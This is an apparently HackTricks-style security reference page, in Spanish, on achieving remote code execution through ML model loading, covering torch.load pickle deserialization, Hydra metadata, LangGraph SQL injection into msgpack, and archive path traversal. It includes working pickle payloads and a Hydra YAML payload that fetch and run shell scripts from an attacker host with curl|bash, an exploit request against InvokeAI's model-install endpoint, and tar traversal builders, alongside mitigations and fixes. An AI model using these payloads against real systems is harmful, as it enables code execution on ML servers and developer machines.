# RCE de modelos

{{#include ../banners/hacktricks-training.md}}

## Carga de modelos para RCE

Los modelos de Machine Learning suelen compartirse en distintos formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden cargarse en las máquinas de los desarrolladores o en sistemas de producción para utilizarlos. Por lo general, los modelos no deberían contener código malicioso, pero hay casos en los que el modelo puede usarse para ejecutar código arbitrario en el sistema como una funcionalidad prevista o debido a una vulnerabilidad en la biblioteca de carga de modelos.

La siguiente tabla enumera vulnerabilidades representativas de esta categoría:

| **Framework / Tool**        | **Vulnerabilidad (CVE si está disponible)**                                                    | **Vector de RCE**                                                                                                                           | **Referencias**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialización insegura en* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malicioso en un checkpoint del modelo provoca la ejecución de código (eludiendo la protección `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + descarga de un modelo malicioso provoca la ejecución de código; RCE mediante deserialización de Java en la API de administración                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserialización insegura de checkpoint mediante `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint no confiable activa el reducer de pickle durante `load_model_trainer_states_from_checkpoint` → ejecución de código en el worker de ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | Inyección SQL + hook de extensión inseguro de MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | La clave `filter` controlada por el usuario inyecta sintaxis SQL/JSON-path, `UNION SELECT` falsifica una fila de checkpoint y, luego, la deserialización de `msgpack` importa y llama código Python elegido por el atacante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar un modelo desde YAML usa `yaml.unsafe_load` (ejecución de código) <br> Cargar un modelo con una capa **Lambda** ejecuta código Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análisis de TFLite)                                                                                          | Un modelo `.tflite` manipulado provoca un desbordamiento de enteros → corrupción del heap (posible RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Cargar un modelo mediante `joblib.load` ejecuta un pickle con el payload `__reduce__` del atacante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` inseguro) *disputado*                                                                              | El valor predeterminado de `numpy.load` permitía arrays de objetos serializados con pickle: un `.npy/.npz` malicioso provoca ejecución de código                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | La ruta de pesos externos del modelo ONNX puede salir del directorio (leer archivos arbitrarios) <br> Un tar de modelo ONNX malicioso puede sobrescribir archivos arbitrarios (lo que puede provocar RCE) | |
| ONNX Runtime (riesgo de diseño)  | *(Sin CVE)* Operadores personalizados / flujo de control de ONNX                                                                                    | Un modelo con un operador personalizado requiere cargar código nativo del atacante; grafos de modelos complejos abusan de la lógica para ejecutar cálculos no previstos   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Usar la API de carga de modelos con `--model-control` habilitado permite el path traversal relativo para escribir archivos (p. ej., sobrescribir `.bashrc` para lograr RCE)    | |
| **GGML (formato GGUF)**      | **CVE-2024-25664 … 25668** (múltiples desbordamientos del heap)                                                                         | Un archivo de modelo GGUF malformado provoca desbordamientos de búfer del heap en el parser, lo que permite ejecutar código arbitrario en el sistema de la víctima                     | |
| **Keras (formatos antiguos)**   | *(Sin CVE nuevo)* Modelo Keras H5 heredado                                                                                         | El código de una capa Lambda en un modelo HDF5 (`.h5`) malicioso sigue ejecutándose al cargarlo (el safe_mode de Keras no cubre el formato antiguo: «downgrade attack») | |
| **Otros** (general)        | *Defecto de diseño* – Serialización con Pickle                                                                                         | Muchas herramientas de ML (p. ej., formatos de modelo basados en pickle, `pickle.load` de Python) ejecutan código arbitrario incrustado en archivos de modelo, a menos que se apliquen mitigaciones | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadatos no confiables pasados a `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Los metadatos/configuración del modelo controlados por el atacante asignan `_target_` a un callable arbitrario (p. ej., `builtins.exec`) → se ejecuta durante la carga, incluso con formatos «seguros» (`.safetensors`, `.nemo`, `config.json` del repo) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Además, hay algunos modelos basados en pickle de Python, como los utilizados por [PyTorch](https://github.com/pytorch/pytorch/security), que pueden usarse para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Por lo tanto, cualquier modelo basado en pickle podría ser especialmente susceptible a este tipo de ataques, aunque no aparezca en la tabla anterior.

### Metadatos de Hydra → RCE (funciona incluso con safetensors)

`hydra.utils.instantiate()` importa y llama cualquier `_target_` con notación de puntos en un objeto de configuración/metadatos. Cuando bibliotecas como Hugging Face Transformers pasan **metadatos de modelo no confiables** a `instantiate()`, un atacante puede proporcionar un callable y argumentos que se ejecutan inmediatamente durante la carga del modelo (no se requiere pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Ejemplo de payload (funciona en `model_config.yaml` de `.nemo`, `config.json` del repo o `__metadata__` dentro de `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Puntos clave:
- Se activa antes de la inicialización del modelo en `restore_from/from_pretrained` de NeMo, los codificadores de HuggingFace de uni2TS y los cargadores de FlexTok.
- La lista de bloqueo de cadenas de Hydra se puede eludir mediante rutas de importación alternativas (p. ej., `enum.bltns.eval`) o nombres resueltos por la aplicación (p. ej., `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok también analiza metadatos convertidos en cadenas con `ast.literal_eval`, lo que permite DoS (sobrecarga de CPU/memoria) antes de la llamada a Hydra.

### 🆕  InvokeAI RCE mediante `torch.load` (CVE-2024-12029)

`InvokeAI` es una interfaz web de código abierto popular para Stable-Diffusion. Las versiones **5.3.1 – 5.4.2** exponen el endpoint REST `/api/v2/models/install`, que permite a los usuarios descargar y cargar modelos desde URL arbitrarias.<sup>[[1]](#references)</sup>

Internamente, el endpoint acaba llamando a:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Cuando el archivo proporcionado es un **checkpoint de PyTorch (`*.ckpt`)**, `torch.load` realiza una **deserialización de pickle**. Como el contenido procede directamente de la URL controlada por el usuario, un atacante puede insertar un objeto malicioso con un método `__reduce__` personalizado dentro del checkpoint; el método se ejecuta **durante la deserialización**, lo que provoca **ejecución remota de código (RCE)** en el servidor de InvokeAI.

La vulnerabilidad recibió el identificador **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guía paso a paso de explotación

1. Crea un checkpoint malicioso:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Aloja `payload.ckpt` en un servidor HTTP que controles (p. ej., `http://ATTACKER/payload.ckpt`).
3. Desencadena el endpoint vulnerable (no se requiere autenticación):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Cuando InvokeAI descarga el archivo, llama a `torch.load()` → se ejecuta el gadget `os.system` y el atacante obtiene ejecución de código en el contexto del proceso de InvokeAI.

Exploit listo para usar: el módulo de **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo el proceso.<sup>[[3]](#references)</sup>

#### Condiciones

•  InvokeAI 5.3.1-5.4.2 (el valor predeterminado de la opción de análisis es **false**)
•  `/api/v2/models/install` accesible para el atacante
•  El proceso tiene permisos para ejecutar comandos de shell

#### Mitigaciones

* Actualiza a **InvokeAI ≥ 5.4.3**: el parche establece `scan=True` de forma predeterminada y analiza el malware antes de la deserialización.<sup>[[2]](#references)</sup>
* Al cargar checkpoints mediante programación, usa `torch.load(file, weights_only=True)` o el nuevo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Aplica listas de permitidos o firmas a las fuentes de modelos y ejecuta el servicio con los mínimos privilegios.

> ⚠️ Recuerda que **cualquier** formato basado en Python pickle (incluidos muchos archivos `.pt`, `.pkl`, `.ckpt` y `.pth`) es inherentemente inseguro al deserializarlo desde fuentes no confiables.

---

Ejemplo de mitigación improvisada si debes mantener versiones antiguas de InvokeAI ejecutándose detrás de un reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE en NVIDIA Merlin Transformers4Rec mediante `torch.load` inseguro (CVE-2025-23298)

Transformers4Rec de NVIDIA (parte de Merlin) exponía un cargador de checkpoints inseguro que llamaba directamente a `torch.load()` con rutas proporcionadas por el usuario. Como `torch.load` depende de Python `pickle`, un atacante puede crear un checkpoint que ejecute código arbitrario mediante un reductor durante la deserialización.<sup>[[5]](#references)</sup>

Ruta vulnerable (antes de la corrección): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por qué esto permite RCE: en Python `pickle`, un objeto puede definir un reductor (`__reduce__`/`__setstate__`) que devuelve una función invocable y sus argumentos. La función se ejecuta durante la deserialización. Si un checkpoint contiene un objeto de este tipo, su código se ejecuta antes de que se utilicen los pesos.

Ejemplo mínimo de checkpoint malicioso:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vectores de entrega y alcance del impacto:
- Checkpoints/modelos troyanizados compartidos mediante repos, buckets o registros de artefactos
- Pipelines automatizados de reanudación/despliegue que cargan checkpoints automáticamente
- La ejecución ocurre dentro de workers de entrenamiento/inferencia, a menudo con privilegios elevados (p. ej., root en contenedores)

Solución: El commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) reemplazó la llamada directa a `torch.load()` por un deserializador restringido y con lista de permitidos implementado en `transformers4rec/utils/serialization.py`. El nuevo cargador valida los tipos/campos e impide que se invoquen callables arbitrarios durante la carga.<sup>[[7]](#references)</sup>

Recomendaciones defensivas específicas para checkpoints de PyTorch:
- No deserialices con pickle datos que no sean de confianza. Cuando sea posible, prefiere formatos no ejecutables como [Safetensors](https://huggingface.co/docs/safetensors/index) u ONNX.
- Si debes usar la serialización de PyTorch, asegúrate de que `weights_only=True` (compatible con versiones más recientes de PyTorch) o usa un unpickler personalizado con una lista de permitidos, similar al parche de Transformers4Rec.<sup>[[4]](#references)</sup>
- Exige procedencia/firmas del modelo y ejecuta la deserialización en un entorno aislado (seccomp/AppArmor; usuario no root; sistema de archivos restringido y sin tráfico de salida a la red).
- Vigila la creación de procesos secundarios inesperados por parte de los servicios de ML al cargar checkpoints; rastrea el uso de `torch.load()`/`pickle`.

POC y referencias de versiones vulnerables/parcheadas:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Cargador vulnerable anterior al parche: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC de checkpoint malicioso: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Cargador posterior al parche: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Ejemplo: creación de un modelo malicioso de PyTorch

- Crea el modelo:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Carga el modelo:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialización de Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

El endpoint `resnet` de Tencent FaceDetection-DSFD deserializa datos controlados por el usuario. ZDI confirmó que un atacante remoto puede inducir a una víctima a cargar una página o archivo malicioso, hacer que este envíe un blob serializado manipulado a ese endpoint y activar la deserialización como `root`, lo que conduce al compromiso total.

El flujo del exploit refleja el abuso típico de pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Cualquier gadget accesible durante la deserialización (constructores, `__setstate__`, callbacks del framework, etc.) puede convertirse en un arma de la misma manera, independientemente de si el transporte era HTTP, WebSocket o un archivo depositado en un directorio vigilado.



### LangGraph: SQLi en el checkpointer → RCE mediante MessagePack

Esta cadena de ataque es interesante porque el atacante **no necesita subir un archivo de modelo malicioso**. En su lugar, la aplicación expone una **API de persistencia de agentes de IA** (`get_state_history(..., filter=...)`) y la entrada del usuario llega al generador de consultas del checkpointer.

#### 1. SQLi estructural en los filtros de metadatos

Un patrón vulnerable de SQLite tenía este aspecto:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

El valor se vincula más adelante, pero `query_key` se concatena en la **cadena de la ruta JSON**, así que un `'` dentro de la clave del diccionario sale de `'$.{query_key}'` e inyecta SQL. La misma lección se aplica a **rutas JSON, identificadores, operadores, `LIMIT` y campos TTL**: los placeholders solo protegen los valores, no la sintaxis estructural de la consulta.

#### 2. `UNION SELECT` puede apuntar a destinos posteriores, no solo al robo de datos

La consulta devuelve `type` y bytes `checkpoint` serializados, que luego se consumen como:

```python
self.serde.loads_typed((type, checkpoint))
```

Eso significa que una SQLi en la cláusula `WHERE` puede inyectar una **fila de resultado falsa**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Si posteriormente el código analiza, deserializa, escribe o ejecuta alguna columna seleccionada, vincula esas columnas con sus sinks. En este caso, la fila falsa convierte SQLi en **deserialización controlada por el atacante**.

#### 3. Los hooks de extensión inseguros de MessagePack equivalen a gadgets de código

La ruta `msgpack` de LangGraph usaba un hook de extensión personalizado que desempaquetaba una tupla anidada y ejecutaba:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Así que un objeto de extensión MessagePack que codifique algo equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, resuelve `system` y ejecuta el comando. Al revisar frameworks de IA, inspecciona los **revivers personalizados de MessagePack/JSON/pickle** en busca de imports dinámicos, reflection o ejecución arbitraria de callables.

#### 4. Patrón de auditoría práctica para frameworks de agentes

Revisa cualquier entrada controlada por el usuario que llegue a:
- APIs de historial de estado / memoria / reproducción / listado de checkpoints
- constructores de filtros estructurados que generan SQL o fragmentos de consultas Redis
- deserializadores personalizados (`pickle`, `msgpack`, hooks de objetos de `json`, constructores de YAML)
- rutas de recuperación que confían en las filas devueltas por la capa de persistencia

Esta cadena específica afectó a despliegues self-hosted de LangGraph que usaban checkpointers de **SQLite** o **Redis**, cuando usuarios no confiables podían controlar `filter`. Las versiones parcheadas indicadas en la divulgación fueron `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` y `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modelos a Path Traversal

Como se comenta en [**esta publicación de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la mayoría de los formatos de modelos usados por distintos frameworks de IA se basan en archivos comprimidos, normalmente `.zip`. Por lo tanto, quizá sea posible abusar de estos formatos para realizar ataques de path traversal y leer archivos arbitrarios del sistema donde se carga el modelo.<sup>[[16]](#references)</sup>

Por ejemplo, con el siguiente código puedes crear un modelo que, al cargarse, creará un archivo en el directorio `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

O bien, con el siguiente código puedes crear un modelo que creará un enlace simbólico al directorio `/tmp` al cargarse:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Análisis profundo: deserialización de Keras .keras y búsqueda de gadgets

Para una guía centrada en los aspectos internos de .keras, el RCE mediante capas Lambda, el problema de importación arbitraria en ≤ 3.8 y la búsqueda de gadgets dentro de la allowlist tras la corrección, consulta:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog de OffSec – "CVE-2024-12029 – Deserialización de datos no confiables en InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit de la corrección de InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentación del módulo de Metasploit de Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – consideraciones de seguridad para torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog de ZDI – CVE-2025-23298: lograr la ejecución remota de código en NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Aviso de ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit de la corrección de Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Cargador vulnerable anterior a la corrección (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC de checkpoint malicioso (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Cargador posterior a la corrección (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers de Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Ejecución remota de código con formatos y bibliotecas modernos de AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentación de Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit de la block-list de Hydra (advertencia sobre RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – De SQLi a RCE: explotación del checkpointer de LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Cómo convertir errores Archive Slip en recompensas de alto valor por vulnerabilidades de AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
